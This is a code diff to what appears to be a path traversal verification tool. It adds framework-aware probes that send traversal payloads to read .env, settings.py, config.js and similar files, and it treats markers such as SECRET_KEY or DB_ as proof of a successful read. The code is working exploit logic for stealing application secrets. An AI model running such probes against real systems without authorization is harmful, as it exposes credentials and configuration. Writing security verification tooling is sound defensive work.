@@ -3344,6 +3344,69 @@ def verify_generic_path_traversal(
                                 step(f"BACKUP FILE: {_btarget} accesible → traversal confirmed")
                         except Exception:
                             pass
+                    # Framework-specific file targets: .env, settings.py, config.js etc.
+                    if not res.verified:
+                        _fw_detect = (str(source_dir or "") + str(dockerfile_body or "") +
+                                      str(docker_image or "")).lower()
+                        _FRAMEWORK_EXTRA_TARGETS: list = []
+                        if "django" in _fw_detect:
+                            _FRAMEWORK_EXTRA_TARGETS = [
+                                ("app/settings.py", "SECRET_KEY"),
+                                ("settings.py", "SECRET_KEY"),
+                                ("config/settings.py", "SECRET_KEY"),
+                                (".env", "SECRET_KEY"),
+                            ]
+                        elif "flask" in _fw_detect or "werkzeug" in _fw_detect:
+                            _FRAMEWORK_EXTRA_TARGETS = [
+                                (".env", "SECRET_KEY"),
+                                ("app.py", "SECRET_KEY"),
+                                ("config.py", "SECRET_KEY"),
+                            ]
+                        elif any(x in _fw_detect for x in ("node", "express", "nuxt", "next")):
+                            _FRAMEWORK_EXTRA_TARGETS = [
+                                (".env", "DB_"),
+                                ("package.json", '"name"'),
+                                ("config.js", "module.exports"),
+                                (".env.local", "DB_"),
+                            ]
+                        else:
+                            _FRAMEWORK_EXTRA_TARGETS = [
+                                (".env", "DB_"),
+                                (".env.local", "DB_"),
+                                ("config.yml", None),
+                                ("config.yaml", None),
+                            ]
+                        for _ftarget, _fmarker in _FRAMEWORK_EXTRA_TARGETS:
+                            if res.verified:
+                                break
+                            _fpayload = _depth2 + _ftarget
+                            try:
+                                import requests as _rq_fw
+                                _furl = base_url.rstrip("/") + "/" + win_ep.lstrip("/")
+                                if _url_path_mode:
+                                    _fr = _rq_fw.get(
+                                        _furl.rstrip("/") + "/" + _fpayload,
+                                        headers=dict(custom_headers or {}), timeout=10)
+                                else:
+                                    _fr = _rq_fw.request(
+                                        (http_method or "GET").upper(), _furl,
+                                        params={win_pp: _fpayload} if (http_method or "GET").upper() == "GET" else None,
+                                        data={win_pp: _fpayload} if (http_method or "GET").upper() != "GET" else None,
+                                        headers=dict(custom_headers or {}), timeout=10)
+                                _fb = _fr.text if hasattr(_fr, "text") else ""
+                                _fok = (_fr.status_code == 200 and len(_fb.strip()) > 10 and
+                                        (_fmarker is None or _fmarker in _fb))
+                                if _fok:
+                                    res.verified = True
+                                    res.ok = True
+                                    res.evidence["framework_file_read"] = {
+                                        "target": _ftarget, "payload": _fpayload,
+                                        "body_snippet": _fb[:300]}
+                                    res.detail = (f"PATH TRAVERSAL confirmado via archivo de "
+                                                  f"framework ({_ftarget}) con payload {_fpayload!r}")
+                                    step(f"FRAMEWORK FILE: {_ftarget} accesible → traversal confirmed")
+                            except Exception:
+                                pass
         # LFI param fuzzing for generic verifier (like verify_wordpress_path_traversal)
         _gen_path_param = win_pp or path_param_hint or ""
         if (not res.verified and parameters
